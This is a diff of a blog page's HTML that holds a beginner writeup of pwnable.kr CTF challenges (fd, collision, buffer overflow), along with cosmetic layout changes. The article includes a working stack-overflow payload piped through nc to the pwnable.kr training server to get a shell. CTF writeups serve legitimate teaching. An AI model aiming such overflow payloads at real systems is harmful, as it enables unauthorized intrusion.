@@ -7,6 +7,10 @@
   <title>pwnable.kr: fd, collision &amp; buffer overflow · sw1tchc4se</title>
   <meta name="description" content="The first of three beginner pwnable.kr writeups — fd, and how a Linux file descriptor trick lets you write straight into the compared buffer." />
   <meta name="author" content="sw1tchc4se" />
+  <meta name="theme-color" content="#FCF3F6" media="(prefers-color-scheme: light)" />
+  <meta name="theme-color" content="#241D29" media="(prefers-color-scheme: dark)" />
+  <link rel="icon" href="/assets/avatar.svg" type="image/svg+xml" />
+  <link rel="apple-touch-icon" href="/assets/avatar.png" />
   <link rel="canonical" href="https://sw1tchc4se.github.io/post/pwnable-fd-col-bof/" />
   <meta property="og:type" content="article" />
   <meta property="og:site_name" content="sw1tchc4se" />
@@ -36,8 +40,7 @@
   <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,600;9..144,700&family=Nunito:wght@400;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="../../css/style.css" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css" />
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
 </head>
 <body>
   <main class="container">
@@ -46,12 +49,16 @@
         <a class="back-link" href="../../posts/">← all posts</a>
         <h1>pwnable.kr: fd, collision &amp; buffer overflow</h1>
         <div class="post-meta">
-          <span>Jun 1, 2026</span>
-          <span>6 min read</span>
+          <span><span data-icon="calendar"></span> Jun 1, 2026</span>
+          <span class="coffee"><span data-icon="coffee"></span> 6 min</span>
         </div>
         <div class="tags"><a class="tag" href="../../posts/?tag=writeup">writeup</a><a class="tag" href="../../posts/?tag=pwn">pwn</a><a class="tag" href="../../posts/?tag=pwnable">pwnable</a></div>
       </header>
-      <article class="prose"><p>hello, today i tried out <a href="https://pwnable.kr/play.php">pwnable</a> and i started out with three basic challenges for the day, this is my writeup for them.</p>
+
+      <div class="divider"><span data-icon="petal"></span></div>
+
+      <div class="post-layout">
+        <article class="prose" id="prose"><p>hello, today i tried out <a href="https://pwnable.kr/play.php">pwnable</a> and i started out with three basic challenges for the day, this is my writeup for them.</p>
 <h2 id="fd">[FD]</h2>
 <p>Mommy! what is a file descriptor in Linux?</p>
 <pre><code class="language-bash">fd@ubuntu:~$ ls
@@ -230,11 +237,21 @@ gets(overflowme);      // read typed input into that box</code></pre>
 <p>this is what i came up with: <code>(python3 -c 'print("A"*52 + "\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000</code> b"A"*52 covers everything for those 52 bytes with A and +  \xbe\xba\xfe\xca writes the key, but it didn't work for some reason.</p>
 <p>so this is what i ended up actually using: <code>(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*52+b"\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000</code></p>
 <p>this is because of python3 syntax, i've heard from someone that my first command would have worked if i had used python2, but i can't confirm or deny that. after that i got a shell and read the flag!</p></article>
+        <aside class="toc" id="toc" style="display:none">
+          <h4><span data-icon="archive"></span> contents</h4>
+          <ul id="toc-list"></ul>
+        </aside>
+      </div>
+
+      <div id="reactions-mount"></div>
     </div>
   </main>
 
-  <script>window.__POST_SLUG__ = "pwnable-fd-col-bof";</script>
-  <script src="../../js/blog.js"></script>
-  <script src="../../js/post.js"></script>
+  <script>
+    window.__POST_SLUG__ = "pwnable-fd-col-bof";
+    window.__PRERENDERED__ = true;
+  </script>
+  <script defer src="../../js/blog.js"></script>
+  <script defer src="../../js/post.js"></script>
 </body>
 </html>
